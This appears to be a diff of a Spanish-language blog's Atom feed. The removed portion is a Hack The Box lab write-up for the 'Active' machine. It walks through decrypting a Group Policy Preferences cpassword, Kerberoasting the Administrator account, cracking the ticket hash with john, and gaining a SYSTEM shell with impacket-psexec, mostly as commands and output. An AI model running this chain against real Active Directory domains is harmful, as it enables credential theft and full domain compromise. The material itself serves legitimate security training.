-   2   │ &amp;lt;Groups &lt;span class=&quot;nv&quot;&gt;clsid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;User &lt;span class=&quot;nv&quot;&gt;clsid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;active
-       │ .htb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;VC_TGS&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;changed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2018-07-18 20:46:06&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;Properties &lt;span class=&quot;nv&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;U
-       │ &quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;newName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;fullName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;cpassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8
-       │ pG5aSVYdYw/NglVmQ&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;changeLogon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;noChange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;neverExpires&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;acctDisabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;userName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;active.htb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;VC_TGS&quot;&lt;/span&gt;/&amp;gt;&amp;lt;/User&amp;gt;
-   3   │ &amp;lt;/Groups&amp;gt;
-───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vamos a filtrar por la información que nos interesa, que es el campo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cpassword&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userName&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;active.htb/Policies/&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;se&quot;&gt;\}&lt;/span&gt;/MACHINE/Preferences/Groups/Groups.xml | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'cpassword=&quot;[^&quot;]\+&quot;\|userName=&quot;[^&quot;]\+&quot;'&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;cpassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;userName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;active.htb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;VC_TGS&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Con la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gpp-decrypt&lt;/code&gt; podemos obtener la contraseña en texto claro, en este caso para el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;active.htb\SVC_TGS&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
-GPPstillStandingStrong2k18
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como siempre, guardamos las credenciales que identifiquemos y vamos a validarlas:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.100 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'SVC_TGS'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'GPPstillStandingStrong2k18'&lt;/span&gt;
-SMB         10.10.10.100    445    DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 6.1 Build 7601 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:DC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:active.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.100    445    DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 
-active.htb&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;VC_TGS:GPPstillStandingStrong2k18
-❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.100 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'SVC_TGS'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'GPPstillStandingStrong2k18'&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
-        Disk                                                    Permissions     Comment
-        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
-        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
-        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
-        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   NO ACCESS       Remote IPC
-        NETLOGON                                                READ ONLY       Logon server share 
-        Replication                                             READ ONLY
-        SYSVOL                                                  READ ONLY       Logon server share 
-        Users                                                   READ ONLY
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que las credenciales son válidas y ahora tenemos permisos de lectura sobre varios recursos que antes no podíamos del servicio SMB. Ahora podríamos tratar de conectarnos a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcclient&lt;/code&gt; para obtener información sobre el dominio:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SVC_TGS&quot;&lt;/span&gt; 10.10.10.100
-Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;VC_TGS&lt;span class=&quot;s1&quot;&gt;'s password: 
-rpcclient $&amp;gt; enumdomusers
-user:[Administrator] rid:[0x1f4]
-user:[Guest] rid:[0x1f5]
-user:[krbtgt] rid:[0x1f6]
-user:[SVC_TGS] rid:[0x44f]
-rpcclient $&amp;gt; enumdomgroups
-group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
-group:[Domain Admins] rid:[0x200]
-group:[Domain Users] rid:[0x201]
-group:[Domain Guests] rid:[0x202]
-group:[Domain Computers] rid:[0x203]
-group:[Domain Controllers] rid:[0x204]
-group:[Schema Admins] rid:[0x206]
-group:[Enterprise Admins] rid:[0x207]
-group:[Group Policy Creator Owners] rid:[0x208]
-group:[Read-only Domain Controllers] rid:[0x209]
-group:[DnsUpdateProxy] rid:[0x44e]
-rpcclient $&amp;gt; querygroupmem 0x200
-        rid:[0x1f4] attr:[0x7]
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que el único usuario dentro del grupos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Admins&lt;/code&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt;. Ahora, con la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket-GetUserSPNs&lt;/code&gt; podemos solicitar un TGS, en este caso del usuario &lt;strong&gt;Administrator&lt;/strong&gt;. (&lt;strong&gt;Nota&lt;/strong&gt;: En caso de obtener el error &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kerberos SessionError&lt;/code&gt;, nos instalamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdate&lt;/code&gt; para sincronizar nuestro relog con el Domain Controller &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdate -n 10.10.10.100&lt;/code&gt;)
-.&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ impacket-GetUserSPNs &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 &lt;span class=&quot;nt&quot;&gt;-request&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-output&lt;/span&gt; tgs.hash
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-
-ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
-&lt;span class=&quot;nt&quot;&gt;--------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;
-active/CIFS:445       Administrator  &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Group Policy Creator Owners,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Users,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;active,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb  2018-07-18 14:06:40.351723  2021-01-21 10:07:03.723783
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como ya tenemos un hash dentro del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tgs.hash&lt;/code&gt;, ya debemos estar pensando en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt tgs.hash
-Using default input encoding: UTF-8
-Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;krb5tgs, Kerberos 5 TGS etype 23 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 HMAC-MD5 RC4]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Will run 8 OpenMP threads
-Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
-Ticketmaster1968 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-1g 0:00:00:47 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-12-05 22:30&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.02121g/s 223568p/s 223568c/s 223568C/s Tiffani1432..Thehunter22
-Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
-Session completed
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya tenemos la contraseña del usuario &lt;strong&gt;Administrator&lt;/strong&gt; del dominio y podemos conectarnos a la máquina:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Requesting shares on 10.10.10.100.....
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found writable share ADMIN&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Uploading file vzDHsSZG.exe
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Opening SVCManager on 10.10.10.100.....
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating service DVAK on 10.10.10.100.....
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting service DVAK.....
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
-Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.1.7601]
-Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2009 Microsoft Corporation.  All rights reserved.
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
-nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nos encontramos dentro de la máquina como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Kerberoasting" /><category term="Active_Directory" /><category term="Powershell" /><summary type="html">Resolución de la máquina Active en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="LFI" /><category term="DNS_Zone_Transfer" /><category term="File_Misconfiguration" /><category term="Web" /><summary type="html">Resolución de la máquina FriendZone en la plataforma de Hack The Box</summary></entry></feed>
